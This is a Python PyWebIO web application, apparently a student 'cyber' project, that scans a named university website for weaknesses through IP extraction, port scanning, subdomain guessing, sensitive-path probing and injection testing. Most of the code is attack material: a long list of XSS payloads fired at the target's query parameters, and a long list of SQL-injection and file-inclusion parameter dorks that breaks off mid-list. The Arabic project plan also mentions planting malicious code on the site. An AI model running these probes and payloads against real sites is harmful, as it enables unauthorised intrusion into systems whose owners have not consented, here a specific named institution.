from pywebio.output import *
from pywebio.session import *
from pywebio.pin import *
from pywebio import start_server
from pywebio import config
from pywebio import *
from pywebio.pin import *
import socket
import requests
import whois

@config(title='حماية وكشف نقاط الضعف', description='Cyber APP [عن التطبيق والمشروع]')
def app():
    put_html('<center><h2>Security Project scanner [cyber]</h2></center>')
    put_html('<center><p>مشروع سايبر بلغة بايثون لجمع معلومات وكشف نقاط الضعف</p></center>')
    put_html('<img src="https://d.top4top.io/p_30475uj2d1.png" width=100%>').style('text-align:right;')
    put_html('<hr>')
    put_tabs([
        {'title':'1️⃣ IP Extractor |','content':put_text('تطبيق استخراج الايبي بالموقع').style('color:red;text-align:center')},
        {'title':'2️⃣ Port Scanner |','content':put_text('تطبيق فحص منافذ الموقع وهل هي خطرة ام لاء').style('color:red;text-align:center')},
        {'title':'3️⃣ Sub Domain search |','content':put_text('تطبيق استخراج سب دومينز للموقع').style('color:red;text-align:center')},
        {'title':'4️⃣ Path Founder |','content':put_text('تطبيق بحث عن مسارات حساسة واستخراجها').style('color:red;text-align:center')},
        # {'title':' Path Founder |','content':put_text('').style('color:red;')}
    ]).style('text-align:center;font-weight:bold;direction:rtl;text-align:right;')

    put_html('''
                 <details>
                    <summary>Cyber APP Project [مشروع سايبر وخطواته]</summary>
                        <h4>نظام ويب لفحص نقاط الضعف في موقع الجامعة :</h4>
                        <a href='http://aspu.edu.sy/'>http://aspu.edu.sy/</a><br><br>
                        <p>لغة البرمجة المستخدمة : بايثون (تطبيق ويب) </p>
                        <p>1- استخراج ايبي الموقع والتأكد من حماية كلاود فلير ضد هجمات حرمان الخدمة</p>
                        <p>2- استخراج البورتات المفتوحة ان وجدت وماهي خطورتها وكيفية اغلاقها</p>
                        <p>3- تفكيك الموقع وسحب الاكواد البرمجية ومعرفة السكربتات المركبة</p>
                        <p>4- سحب مسارات التي قد تكون خطرة وتقديم تقرير عن خطورتها وكيفية اصلاحها</p>
                        <p>5- البحث عن لوحات التحكم ومنع المهاجم من عمليات الهجوم الغاشم</p>
                        <p>6- معرفة نوع السيرفر والبحث عن الثغرات الاكثر انتشاراً ومدى خطورتها وكيفية اصلاحها ان توفرت</p>
                        <p>7- تركيب ملف برمجي على الموقع لحماية و لمعرفة من يقوم بالهجوم عليه او فحص ثغراته</p>
                        <p>8-  وضع برمجية خبيثة في الموقع في صفحات حساسة بحيث اذا وصل له شخص غير المدير يتم رصد الحركة</p>
                    </details>
                 
                 
        ''').style('direction:rtl;text-align:right;')
    
    
    
    
    
@config(title='استخراج ايبي', description='Extract site ip [تطبيق استخراج ايبي]')
def ip():
    put_html('<center><h2>Security Project scanner [cyber]</h2></center>')
    put_html('<center><p>المرحلة الاولى ارسال طلب للموقع هل يعمل واستخراج الايبي الخاص به</p></center>')
    put_html('<h4>Site : [الموقع المستهدف] : http://aspu.edu.sy/ </h4>').style('color:green;text-align:center;')
    put_html('<img src="https://h.top4top.io/p_3047dmbz21.png" width=100%>').style('text-align:right;')
    put_html('<hr>')
    
    put_html('''
             <h4>1- ارسال طلب للموقع هل يعمل ام لاء</h4>
             <h4>2- استخراج ايبي الموقع</h4>
             <h4>3- ارسال طلب للموقع وسحب الاكواد</h4>
             ''').style('direction:rtl;text-align:right;')
    
    put_row([
        put_column([
            put_input('input1',label='رابط الموقع')
        ]).style('direction:rtl;text-align:right;')
    ])
    def sender():
        url1 = '%s' % pin.input1
        req = requests.get(url1)
        if req.status_code == 200 :
            popup('Request Sended : تم ارسال طلب للموقع',[
                put_html('<h3>[Success]- The site Found on Internet :  => 200 </h3>').style('color:green;'),
                put_text(url1)
            ])
        elif req.status_code == 404 :
            popup('Request Sended : تم ارسال طلب للموقع',[
                put_html('<h3>[Erorr] - The site not Found on Internet :  => 404 </h3>').style('color:red;'),
                put_text(url1)
            ])
        else:
            pass
    def ipex():
        url2 = '%s' % pin.input1
        new = url2.replace('http://',' ')
        ip_address = socket.gethostbyname(new)
        popup('Extract ip : استخراج ايبي الموقع',[
            put_html('<h3>ip Extracted : </h3>').style('color:green;'),
            put_text(ip_address)
        ])
    def codeextra():
        url3 = '%s' % pin.input1
        req = requests.get(url3)
        
        popup('Code Extract : استخراج اكواد الموقع',[
            put_html('<h3>Code Extracted : </h3>').style('color:green;'),
            put_text(req.text)
        ])
    def security():
        popup('Security Steps : المخاطر والحماية',[
        put_html('<h3>Security Type : </h3>').style('color:green;'),
        put_html("""
                 <details>
                    <summary>IP Extractor [جزء استخراج ايبي]</summary>
                        <h4>يجب تركيب حماية كلاود سحابة لرفض الوصول الى ايبي</h4>
                        <p>يتم تركيب سحابة في كل مرة يتم تغيير ايبي مختلف يمنع لاحد ارسال طلبات للموقع والحصول على الايبي وهو امر ضروري حتى حماية من هجمات ديدوس اتاك تفيد</p>
                </details>
            """).style('direction:rtl;text-align:right;'),
        
        put_html("""
                 <details>
                    <summary>Send Requets [جزء التأكد ان الموقع شغال]</summary>
                        <h4>كلاود فلير و تركيب حماية مو سكيورتي</h4>
                        <p>ليش مهم من يرى الموقع شغال ام لاء امر طبيعي ليس له مخاطر</p>
                </details>
            """).style('direction:rtl;text-align:right;'),
        
        put_html("""
                 <details>
                    <summary>Code Extractor [جزء سحب اكواد الموقع]</summary>
                        <h4>يجب تركيب حماية مود سيكورتي</h4>
                        <p>هذه الحماية تأمن الموقع من رفض طلبات التي تأتي عبر برامج ارسال طلبات ويمنع الوصول للاكواد</p>
                </details>
            """).style('direction:rtl;text-align:right;')
        ])
    put_buttons(['التأكد من الموقع انه شغال'],onclick=[sender]).style('width:202px;text-align:right;float:right;')
    put_buttons([' استخرج الايبي الموقع '],onclick=[ipex]).style('width:170px;text-align:right;float:right;')
    put_buttons(['سحب اكواد الموقع'],onclick=[codeextra]).style('width:153px;text-align:right;float:right;')
    put_buttons([dict(label='Security[المخاطر والحماية]', value='s', color='danger')],onclick=[security]).style('width:230px;text-align:right;float:right;')
    hold()
    
    
@config(title='فحص بورتات',description='Port Scanner [تطبيق فحص المنافذ]')
def port():
    put_html('<center><h2>Security Project scanner [cyber]</h2></center>')
    put_html('<center><p>المرحلة الثانية فحص منافذ والبورتات الخاصة بالموقع مع الخدمة مع المخاطر وطرق الحماية</p></center>')
    put_html('<h4>Site : [الموقع المستهدف] : http://aspu.edu.sy/ </h4>').style('color:green;text-align:center;')
    put_html('<img src="https://a.top4top.io/p_30477qdpg1.png" width=100%>').style('text-align:right;')
    put_html('<hr>')
    
    put_html('''
         <h4>- قم بادخال الرابط للبدء بالفحص والبحث (عملية المسح)</h4>
         ''').style('direction:rtl;text-align:right;')
    put_row([
        put_column([
            put_input('inputonetw',label=' ادخل رابط الموقع'),
            put_input('inputtow',label=' ادخل رقم البورت'),
            put_input('inputthree',label=' ادخل اسم البروتوكول'),
        ]).style('direction:rtl;text-align:right;')
    ])
    
    def mainoo():
        si =  '%s' % pin.inputonetw
        ipo = socket.gethostbyname(si)
        for p in range(1,5):
            so = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            so.settimeout(7)
            try:
                con = so.connect((ipo,p))
                if con :
                    p1 = f"[✅] The Port{p} : is Open"
                    print('open')
                    put_text(p1).style('direction:rtl;text-align:right;')
                else:
                    print('closed')
                    p2 = f"[❌] The Port {p} : is Close"
                    put_text(p2).style('direction:rtl;text-align:right;')
                    toast('[+] The Program Finshed Scan ', position='right', duration=0,color='#12B456')
            except Exception as e:
                print(e)
                put_text('❌- Error : فشل في ارسال الطلب بسبب التالي ',e).style('direction:rtl;text-align:right;')
                
                
            
    def protot():
        host =  '%s' % pin.inputtow
        port_e = socket.getservbyport(int(host))
        ppp1 = f"[✅] The service is : {port_e}"
        #put_text(ppp1).style('direction:rtl;text-align:right;')
        popup('protocol Extractor :  استخراج اسم الخدمة للبورت',[
            put_html('<h3>Extracted  : </h3>').style('color:green;'),
            put_text(ppp1)
        ])
    def porocol():
        host =  '%s' % pin.inputthree
        protocol_e = socket.getservbyname(host)
        ppp2 = f"[✅] The Port is {protocol_e}"
        #put_text(ppp2).style('direction:rtl;text-align:right;')
        popup('Port Extractor :  استخراج رقم البورت للخدمة',[
            put_html('<h3>Extracted  : </h3>').style('color:green;'),
            put_text(ppp2)
        ])
    def secu2():
        popup('Security Steps : المخاطر والحماية',[
        put_html('<h3>Security Type : </h3>').style('color:green;'),
        put_html("""
                 <details>
                    <summary>Port scanner [البورتات وفحصها]</summary>
                        <h4>ان غالبية المواقع والانظمة يتم التواصل بين بعضها بالبورتات</h4>
                        <p>- يطلق عليه الهاكر بأسم : منافذ الهاكر للتسلل للنظام او الموقع عبرها</p>
                        <p>- يجب اغلاق برامج الديسكتوب المتصلة مع الموقع مثل فايل زيلا لانه يقوم بفتح بورت 21 من خلاله يتم عملية بروت فورس للوصل على داتا لرفع ملفات على النظام او الموقع</p>
                        <p>- تم انشاء البرنامج بحيث يقوم بفحص بورتات الموقع وبرنامج اخر لمعرفة البورت عبر الرقم او اسم الخدمة للبحث عنه واخذ نظرة هل يشكل خطر ام لاء</p>
                </details>
            """).style('direction:rtl;text-align:right;'),
        
        put_html("""
                 <details>
                    <summary>Port Open [هل يشكل بورت مفتوح خطر على الموقع]</summary>
                        <h4>بورتات محدودة يجب ان تكون مفتوحة مثل بورت التصفح الامن </h4>
                        <p>- الحل الامثل تركيب برنامج سكيورتي على الموقع وجدار حماية يتم رصد كل تحركات التي تحصل على الموقع من عمليات الفحص سنقوم بأضافته في الاجزاء الحماية في نهاية المشروع </p>
                        
                </details>
            """).style('direction:rtl;text-align:right;'),
        
        ])
    put_buttons(['فحص البورتات كاملة'],onclick=[mainoo]).style('width:169px;text-align:right;float:right;')
    put_buttons(['معرفة خدمة البورت '],onclick=[protot]).style('width:161px;text-align:right;float:right;')
    put_buttons(['معرفة بورت الخدمة'],onclick=[porocol]).style('width:161px;text-align:right;float:right;')
    put_buttons([dict(label='Security[المخاطر والحماية]', value='s', color='danger')],onclick=[secu2]).style('width:230px;text-align:right;float:right;')
    put_html('<hr><br>')
    hold()
    
    
    
@config(title='استخراج سب دومينات',description='SubDomain Scann [تطبيق استخراج السب دومين]')
def subdoamin():
    put_html('<center><h2>Security Project scanner [cyber]</h2></center>')
    put_html('<center><p>المرحلة الثالثة التخمين على مسارات سب دومين وعرضها في البرنامج</p></center>')
    put_html('<h4>Site : [الموقع المستهدف] : http://aspu.edu.sy/ </h4>').style('color:green;text-align:center;')
    put_html('<img src="https://l.top4top.io/p_30474v0mk1.png" width=100%>').style('text-align:right;')
    put_html('<hr>')
    put_html('''
         <h4>- قم بادخال الرابط للبدء بالفحص والبحث (عملية المسح)</h4>
         ''').style('direction:rtl;text-align:right;')
    put_row([
        put_column([
            put_input('inputn',label=' ادخل رابط الموقع'),
        ]).style('direction:rtl;text-align:right;')
    ])
    
    def scano():
        linko =  '%s' % pin.inputn
        header = {'User-Agent':'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36'}
        subo = ['www.','my.','webmail.']
        for su in subo :
            url = f"{su}{linko}"
            attack = requests.get('http://'+url,timeout=60,headers=header)
            if attack.status_code == 200 :
                print('[+]- Found 200',su)
                put_table([
                    ['The Site [الموقع]', 'SunDomin[اسماء مجالات]','Vist it[روابط]'],
                    [put_text(url),put_text(su),put_html('<a href="http://{}" target=_blank>Click here[visit]</a>'.format(url))]
                    ])
            elif attack.status_code == 403 :
                print('[+]- Promission Forbidden 403',su)
            elif attack.status_code == 404 :
                print('[+]- Not Found page 404',su)
            else:
                pass
    def infor():
        linko = '%s' % pin.inputn
        w = whois.whois(linko)
        popup('Information Extractor :  استخراج معلومات',[
            put_html('<h3>Extracted  : </h3>').style('color:green;'),
            put_text(w)
        ])
        
    put_buttons(['البدء بعملية الفحص'],onclick=[scano]).style('width:169px;text-align:right;float:right;')
    put_buttons(['استخراج البيانات'],onclick=[infor]).style('width:169px;text-align:right;float:right;')
    put_html('<hr><br>')
    hold()
@config(title='المسارات الحساسة',description='Path Scanner [استخراج مسارات حساسة]')
def pather():
    
    put_html('''
             <h2> بوت بحث عن نقاط الضعف والثغرات</h2><br>
             
             ''').style('text-align:center;')
    
    
    put_html('''
             <p>✔ بحث عن مسارات حساسة في الموقع -</p>
             <p>✔ بحث عن ثغرات وحقنها xss -</p>
             <p>✔ استغلال ثغرات حقن قواعد بيانات -</p>
             ''').style('direction:rtl;text-align:right;')
    
    put_html('''
             <h4>- قم بادخال الرابط للبدء بالفحص والبحث (عملية المسح)</h4>
             ''').style('direction:rtl;text-align:right;')
    put_row([
    put_column([
                put_input('patherr',label=' ادخل رابط الموقع'),
            ]).style('direction:rtl;text-align:right;')
        ])
    
    
    def stattac():
        target_ip = '%s' % pin.patherr
        link = ['1.html','2.html','3.html','4.html','5.html']
        for x in link:
            siteo = f"{target_ip}/{x}"
            req = requests.get(siteo)
            if req.status_code == 200:
                print(target_ip,x,'Found')
                p2 = f"[✅] Path {target_ip}{x} : Found"
                put_text(p2).style('direction:rtl;text-align:right;')
            else:
                print(target_ip,x,'Not Found')
                p2 = f"[❌] The path {target_ip}{x} : Not Found"
                put_text(p2).style('direction:rtl;text-align:right;')
    def stattac1():
        target_ip = '%s' % pin.patherr
        link = ['?q=',
'?s=',
'?search=',
'?id=',
'?lang=',
'?keyword=',
'?query=',
'?page=',
'?keywords=',
'?year=',
'?view=',
'?email=',
'?type=',
'?name=',
'?p=',
'?month=',
'?image=',
'?list_type=',
'?url=',
'?terms=',
'?categoryid=',
'?key=',
'?login=',
'?begindate=',
'?enddate=']
        
        link1 = [
'<input onfocus=javascript:alert(1) autofocus>',
'<input onblur=javascript:alert(1) autofocus><input autofocus>',
'<video poster=javascript:javascript:alert(1)//',
'<body onscroll=javascript:alert(1)><br><br><br><br><br><br>...<br><br><br><br><br><br><br><br><br><br>...<br><br><br><br><br><br><br><br><br><br>...<br><br><br><br><br><br><br><br><br><br>...<br><br><br><br><br><br><br><br><br><br>...<br><br><br><br><input autofocus>',
'<form id=test onforminput=javascript:alert(1)><input></form><button form=test onformchange=javascript:alert(1)>X',
'<video><source onerror="javascript:javascript:alert(1)">',
'<video onerror="javascript:javascript:alert(1)"><source>',
'<form><button formaction="javascript:javascript:alert(1)">X',
'<body oninput=javascript:alert(1)><input autofocus>',
'<math href="javascript:javascript:alert(1)">CLICKME</math>  <math> <maction actiontype="statusline#http://google.com" xlink:href="javascript:javascript:alert(1)">CLICKME</maction> </math>',
'<frameset onload=javascript:alert(1)>',
'<table background="javascript:javascript:alert(1)">',
'<!--<img src="--><img src=x onerror=javascript:alert(1)//">',
'<comment><img src="</comment><img src=x onerror=javascript:alert(1))//">',
'<![><img src="]><img src=x onerror=javascript:alert(1)//">',
'<style><img src="</style><img src=x onerror=javascript:alert(1)//">',
'<li style=list-style:url() onerror=javascript:alert(1)> <div style=content:url(data:image/svg+xml,%%3Csvg/%%3E);visibility:hidden onload=javascript:alert(1)></div>',
'<head><base href="javascript://"></head><body><a href="/. /,javascript:alert(1)//#">XXX</a></body>',
'<SCRIPT FOR=document EVENT=onreadystatechange>javascript:alert(1)</SCRIPT>',
'<OBJECT CLASSID="clsid:333C7BC4-460F-11D0-BC04-0080C7055A83"><PARAM NAME="DataURL" VALUE="javascript:alert(1)"></OBJECT>',
'<object data="data:text/html;base64,%(base64)s">',
'<embed src="data:text/html;base64,%(base64)s">',
'<b <script>alert(1)</script>0',
'<embed src="javascript:alert(1)">',
'<img src="javascript:alert(1)">',
'<image src="javascript:alert(1)">',
'<script src="javascript:alert(1)">',
'<div style=width:1px;filter:glow onfilterchange=javascript:alert(1)>x',
'<? foo="><script>javascript:alert(1)</script>">',
'<! foo="><script>javascript:alert(1)</script>">',
'</ foo="><script>javascript:alert(1)</script>">',
'<a href=java&#1&#2&#3&#4&#5&#6&#7&#8&#11&#12script:javascript:alert(1)>XXX</a>',
'<img src="x` `<script>javascript:alert(1)</script>"` `>',
'<title onpropertychange=javascript:alert(1)></title><title title=>',
'<a href=http://foo.bar/#x=`y></a><img alt="`><img src=x:x onerror=javascript:alert(1)></a>">',
'<!--[if]><script>javascript:alert(1)</script -->',
'<!--[if<img src=x onerror=javascript:alert(1)//]> -->',
'<div style="list-style:url(http://foo.f)\20url(javascript:javascript:alert(1));">X',
'<div style="background:url(/f#&#127;oo/;color:red/*/foo.jpg);">X',
'<div style="font-family:foo{bar;background:url(http://foo.f/oo};color:red/*/foo.jpg);">X',
'<div id="x">XXX</div> <style>  #x{font-family:foo[bar;color:green;}  #y];color:red;{}  </style>',
'<script>({set/**/$($){_/**/setter=$,_=javascript:alert(1)}}).$=eval</script>',
'<script>({0:#0=eval/#0#/#0#(javascript:alert(1))})</script>',
'<meta charset="x-imap4-modified-utf7">&ADz&AGn&AG0&AEf&ACA&AHM&AHI&AGO&AD0&AGn&ACA&AG8Abg&AGUAcgByAG8AcgA9AGEAbABlAHIAdAAoADEAKQ&ACAAPABi',
'<meta charset="x-imap4-modified-utf7">&<script&S1&TS&1>alert&A7&(1)&R&UA;&&<&A9&11/script&X&>',
'<meta charset="mac-farsi">¼script¾javascript:alert(1)¼/script¾',
'X<x style=`behavior:url(#default#time2)` onbegin=`javascript:alert(1)` >',
'1<set/xmlns=`urn:schemas-microsoft-com:time` style=`beh&#x41vior:url(#default#time2)` attributename=`innerhtml` to=`&lt;img/src=&quot;x&quot;onerror=javascript:alert(1)&gt;`>',
'1<animate/xmlns=urn:schemas-microsoft-com:time style=behavior:url(#default#time2) attributename=innerhtml values=&lt;img/src=&quot;.&quot;onerror=javascript:alert(1)&gt;>',
'<vmlframe xmlns=urn:schemas-microsoft-com:vml style=behavior:url(#default#vml);position:absolute;width:100%;height:100% src=%(vml)s#xss></vmlframe>',
'1<a href=#><line xmlns=urn:schemas-microsoft-com:vml style=behavior:url(#default#vml);position:absolute href=javascript:javascript:alert(1) strokecolor=white strokeweight=1000px from=0 to=1000 /></a>',
'<a style="behavior:url(#default#AnchorClick);" folder="javascript:javascript:alert(1)">XXX</a>',
'<a href="javascript:javascript:alert(1)"><event-source src="data:application/x-dom-event-stream,Event:click%0Adata:XXX%0A%0A">',
'<div id="x">x</div> <xml:namespace prefix="t"> <import namespace="t" implementation="#default#time2"> <t:set attributeName="innerHTML" targetElement="x" to="&lt;img&#11;src=x:x&#11;onerror&#11;=javascript:alert(1)&gt;">',
'<script>javascript:alert(1)</script>',
'<IMG SRC="javascript:javascript:alert(1);">',
'<IMG SRC=javascript:javascript:alert(1)>',
'<IMG SRC=`javascript:javascript:alert(1)`>',
'<FRAMESET><FRAME SRC="javascript:javascript:alert(1);"></FRAMESET>',
'<BODY ONLOAD=javascript:alert(1)>',
'<BODY ONLOAD=javascript:javascript:alert(1)>',
'<IMG SRC="jav    ascript:javascript:alert(1);">',
'<IMG SRC="javascript:javascript:alert(1)"',
'<INPUT TYPE="IMAGE" SRC="javascript:javascript:alert(1);">',
'<IMG DYNSRC="javascript:javascript:alert(1)">',
'<IMG LOWSRC="javascript:javascript:alert(1)">',
'<BGSOUND SRC="javascript:javascript:alert(1);">',
'<BR SIZE="&{javascript:alert(1)}">',
'<STYLE>li {list-style-image: url("javascript:javascript:alert(1)");}</STYLE><UL><LI>XSS',
'<META HTTP-EQUIV="refresh" CONTENT="0;url=javascript:javascript:alert(1);">',
'<META HTTP-EQUIV="refresh" CONTENT="0; URL=http://;URL=javascript:javascript:alert(1);">',
'<IFRAME SRC="javascript:javascript:alert(1);"></IFRAME>',
'<TABLE BACKGROUND="javascript:javascript:alert(1)">',
'<TABLE><TD BACKGROUND="javascript:javascript:alert(1)">']
        for x in link:
            for i in link1:
                siteo = f"{target_ip}/{x}{i}"
                req = requests.get(siteo)
                if req.status_code == 200:
                    print(target_ip,x,'Found')
                    p2 = f"[✅] xss parameter with payload {target_ip}{x}{i} : Found"
                    put_text(p2).style('direction:rtl;text-align:right;')
                else:
                    p2 = f"[❌] xss parameter {target_ip}{x} : Not Found"
                    put_text(p2).style('direction:rtl;text-align:right;')      

    def stattac2():
        target_ip = '%s' % pin.patherr
        link = ['trainers.php?id=',
'play_old.php?id=',
'declaration_more.php?decl_id=',
'Pageid=',
'games.php?id=',
'newsDetail.php?id=',
'staff_id=',
'historialeer.php?num=',
'product-item.php?id=',
'news_view.php?id=',
'humor.php?id=',
'communique_detail.php?id=',
'sem.php3?id=',
'opinions.php?id=',
'spr.php?id=',
'pages.php?id=',
'chappies.php?id=',
'prod_detail.php?id=',
'viewphoto.php?id=',
'view.php?id=',
'website.php?id=',
'hosting_info.php?id=',
'gery.php?id=',
'detail.php?ID=',
'publications.php?id=',
'Productinfo.php?id=',
'releases.php?id=',
'ray.php?id=',
'produit.php?id=',
'pop.php?id=',
'shopping.php?id=',
'productdetail.php?id=',
'post.php?id=',
'section.php?id=',
'theme.php?id=',
'page.php?id=',
'shredder-categories.php?id=',
'product_ranges_view.php?ID=',
'shop_category.php?id=',
'channel_id=',
'newsid=',
'news_display.php?getid=',
'ages.php?id=',
'clanek.php4?id=',
'review.php?id=',
'iniziativa.php?in=',
'curriculum.php?id=',
'labels.php?id=',
'look.php?ID=',
'galeri_info.php?l=',
'tekst.php?idt=',
'newscat.php?id=',
'newsticker_info.php?idn=',
'rubrika.php?idr=',
'offer.php?idf=',
'“id=” & intext:”Warning: mysql_fetch_array()',
'“id=” & intext:”Warning: getimagesize()',
'“id=” & intext:”Warning: session_start()',
'“id=” & intext:”Warning: mysql_num_rows()',
'“id=” & intext:”Warning: mysql_query()',
'“id=” & intext:”Warning: array_merge()',
'“id=” & intext:”Warning: preg_match()',
'“id=” & intext:”Warning: ilesize()',
'“id=” & intext:”Warning: filesize()',
'index.php?id=',
'buy.php?category=',
'article.php?ID=',
'play_old.php?id=',
'newsitem.php?num=',
'top10.php?cat=',
'historialeer.php?num=',
'reagir.php?num=',
'Stray-Questions-View.php?num=',
'forum_bds.php?num=',
'game.php?id=',
'view_product.php?id=',
'sw_comment.php?id=',
'news.php?id=',
'avd_start.php?avd=',
'event.php?id=',
'sql.php?id=',
'news_view.php?id=',
'select_biblio.php?id=',
'humor.php?id=',
'ogl_inet.php?ogl_id=',
'fiche_spectacle.php?id=',
'communique_detail.php?id=',
'sem.php3?id=',
'kategorie.php4?id=',
'faq2.php?id=',
'show_an.php?id=',
'preview.php?id=',
'loadpsb.php?id=',
'opinions.php?id=',
'spr.php?id=',
'announce.php?id=',
'participant.php?id=',
'download.php?id=',
'main.php?id=',
'review.php?id=',
'chappies.php?id=',
'read.php?id=',
'prod_detail.php?id=',
'article.php?id=',
'person.php?id=',
'productinfo.php?id=',
'showimg.php?id=',
'view.php?id=',
'website.php?id=',
'hosting_info.php?id=',
'gery.php?id=',
'rub.php?idr=',
'view_faq.php?id=',
'artikelinfo.php?id=',
'detail.php?ID=',
'index.php?=',
'profile_view.php?id=',
'category.php?id=',
'publications.php?id=',
'fellows.php?id=',
'downloads_info.php?id=',
'prod_info.php?id=',
'shop.php?do=part&id=',
'collectionitem.php?id=',
'band_info.php?id=',
'product.php?id=',
'releases.php?id=',
'ray.php?id=',
'produit.php?id=',
'pop.php?id=',
'shopping.php?id=',
'productdetail.php?id=',
'post.php?id=',
'viewshowdetail.php?id=',
'clubpage.php?id=',
'memberInfo.php?id=',
'section.php?id=',
'theme.php?id=',
'page.php?id=',
'shredder-categories.php?id=',
'tradeCategory.php?id=',
'product_ranges_view.php?ID=',
'shop_category.php?id=',
'transcript.php?id=',
'channel_id=',
'item_id=',
'newsid=',
'trainers.php?id=',
'news-full.php?id=',
'news_display.php?getid=',
'index2.php?option=',
'readnews.php?id=',
'newsone.php?id=',
'product-item.php?id=',
'pages.php?id=',
'clanek.php4?id=',
'viewapp.php?id=',
'viewphoto.php?id=',
'galeri_info.php?l=',
'iniziativa.php?in=',
'curriculum.php?id=',
'labels.php?id=',
'story.php?id=',
'look.php?ID=',
'aboutbook.php?id=',
'“id=” & intext:”Warning: mysql_fetch_assoc()',
'“id=” & intext:”Warning: is_writable()',
'“id=” & intext:”Warning: Unknown()',
'“id=” & intext:”Warning: mysql_result()',
'“id=” & intext:”Warning: pg_exec()',
'“id=” & intext:”Warning: require()',
'buy.php?category=',
'pageid=',
'page.php?file=',
'show.php?id=',
'newsitem.php?num=',
'readnews.php?id=',
'top10.php?cat=',
'reagir.php?num=',
'Stray-Questions-View.php?num=',
'forum_bds.php?num=',
'game.php?id=',
'view_product.php?id=',
'sw_comment.php?id=',
'news.php?id=',
'avd_start.php?avd=',
'event.php?id=',
'sql.php?id=',
'select_biblio.php?id=',
'ogl_inet.php?ogl_id=',
'fiche_spectacle.php?id=',
'kategorie.php4?id=',
'faq2.php?id=',
'show_an.php?id=',
'loadpsb.php?id=',
'announce.php?id=',
'participant.php?id=',
'download.php?id=',
'article.php?id=',
'person.php?id=',
'productinfo.php?id=',
'showimg.php?id=',
'rub.php?idr=',
'view_faq.php?id=',
'artikelinfo.php?id=',
'index.php?=',
'profile_view.php?id=',
'category.php?id=',
'fellows.php?id=',
'downloads_info.php?id=',
'prod_info.php?id=',
'shop.php?do=part&id=',
'collectionitem.php?id=',
'band_info.php?id=',
'product.php?id=',
'viewshowdetail.php?id=',
'clubpage.php?id=',
'memberInfo.php?id=',
'tradeCategory.php?id=',
'transcript.php?id=',
'item_id=',
'news-full.php?id=',
'aboutbook.php?id=',
'preview.php?id=',
'material.php?id=',
'read.php?id=',
'viewapp.php?id=',
'story.php?id=',
'newsone.php?id=',
'rubp.php?idr=',
'art.php?idm=',
'title.php?id=',
'index1.php?modo=',
'include.php?*[*]*=',
'nota.php?pollname=',
'index3.php?p=',
'padrao.php?pre=',
'home.php?pa=',
'main.php?type=',
'sitio.php?start=',
'*.php?include=',
'general.php?xlink=',
'show.php?go=',
'nota.php?ki=',
'down*.php?oldal=',
'layout.php?disp=',
'enter.php?chapter=',
'base.php?incl=',
'enter.php?mod=',
'show.php?corpo=',
'head.php?*[*]*=',
'info.php?strona=',
'template.php?str=',
'main.php?doshow=',
'view.php?*[*]*=',
'index.php?to=',
'page.php?cmd=',
'view.php?b=',
'info.php?option=',
'show.php?x=',
'template.php?texto=',
'index3.php?ir=',
'print.php?chapter=',
'file.php?inc=',
'file.php?cont=',
'view.php?cmd=',
'include.php?chapter=',
'path.php?my=',
'principal.php?param=',
'general.php?menue=',
'index1.php?b=',
'info.php?chapter=',
'nota.php?chapter=',
'general.php?include=',
'start.php?addr=',
'index1.php?qry=',
'index1.php?loc=',
'page.php?addr=',
'index1.php?dir=',
'principal.php?pr=',
'press.php?seite=',
'head.php?cmd=',
'home.php?sec=',
'home.php?category=',
'standard.php?cmd=',
'mod*.php?thispage=',
'base.php?to=',
'view.php?choix=',
'base.php?panel=',
'template.php?mod=',
'info.php?j=',
'blank.php?pref=',
'sub*.php?channel=',
'standard.php?in=',
'general.php?cmd=',
'pagina.php?panel=',
'template.php?where=',
'path.php?channel=',
'gery.php?seccion=',
'page.php?tipo=',
'sitio.php?rub=',
'pagina.php?u=',
'file.php?ir=',
'*inc*.php?sivu=',
'path.php?start=',
'page.php?chapter=',
'home.php?recipe=',
'enter.php?pname=',
'layout.php?path=',
'print.php?open=',
'mod*.php?channel=',
'down*.php?phpbb_root_path=',
'*inc*.php?str=',
'gery.php?phpbb_root_path=',
'include.php?middlePart=',
'sub*.php?destino=',
'info.php?read=',
'home.php?sp=',
'main.php?strona=',
'sitio.php?get=',
'sitio.php?index=',
'index3.php?option=',
'enter.php?a=',
'main.php?second=',
'print.php?pname=',
'blank.php?itemnav=',
'blank.php?pagina=',
'index1.php?d=',
'down*.php?where=',
'*inc*.php?include=',
'path.php?pre=',
'home.php?loader=',
'start.php?eval=',
'index.php?disp=',
'head.php?mod=',
'sitio.php?section=',
'nota.php?doshow=',
'home.php?seite=',
'home.php?a=',
'page.php?url=',
'pagina.php?left=',
'layout.php?c=',
'principal.php?goto=',
'standard.php?base_dir=',
'home.php?where=',
'page.php?sivu=',
'*inc*.php?adresa=',
'padrao.php?str=',
'include.php?my=',
'show.php?home=',
'index.php?load=',
'index3.php?rub=',
'sub*.php?str=',
'start.php?index=',
'nota.php?mod=',
'sub*.php?mid=',
'index1.php?*[*]*=',
'pagina.php?oldal=',
'padrao.php?loc=',
'padrao.php?rub=',
'page.php?incl=',
'gery.php?disp=',
'nota.php?oldal=',
'include.php?u=',
'principal.php?pagina=',
'print.php?choix=',
'head.php?filepath=',
'include.php?corpo=',
'sub*.php?action=',
'head.php?pname=',
'press.php?dir=',
'show.php?xlink=',
'file.php?left=',
'nota.php?destino=',
'general.php?module=',
'index3.php?redirect=',
'down*.php?param=',
'default.php?ki=',
'padrao.php?h=',
'padrao.php?read=',
'mod*.php?cont=',
'index1.php?l=',
'down*.php?pr=',
'gery.php?viewpage=',
'template.php?load=',
'nota.php?pr=',
'padrao.php?destino=',
'index2.php?channel=',
'principal.php?opcion=',
'start.php?str=',
'press.php?*[*]*=',
'index.php?ev=',
'pagina.php?pre=',
'nota.php?content=',
'include.php?adresa=',
'sitio.php?t=',
'index.php?sivu=',
'principal.php?q=',
'path.php?ev=',
'print.php?module=',
'index.php?loc=',
'nota.php?basepath=',
'padrao.php?tipo=',
'index2.php?in=',
'principal.php?eval=',
'file.php?qry=',
'info.php?t=',
'enter.php?play=',
'general.php?var=',
'principal.php?s=',
'standard.php?pagina=',
'standard.php?subject=',
'base.php?second=',
'head.php?inc=',
'pagina.php?basepath=',
'main.php?pname=',
'*inc*.php?modo=',
'include.php?goto=',
'file.php?pg=',
'head.php?g=',
'general.php?header=',
'start.php?*root*=',
'enter.php?pref=',
'index3.php?open=',
'start.php?module=',
'main.php?load=',
'enter.php?pg=',
'padrao.php?redirect=',
'pagina.php?my=',
'gery.php?pre=',
'enter.php?w=',
'info.php?texto=',
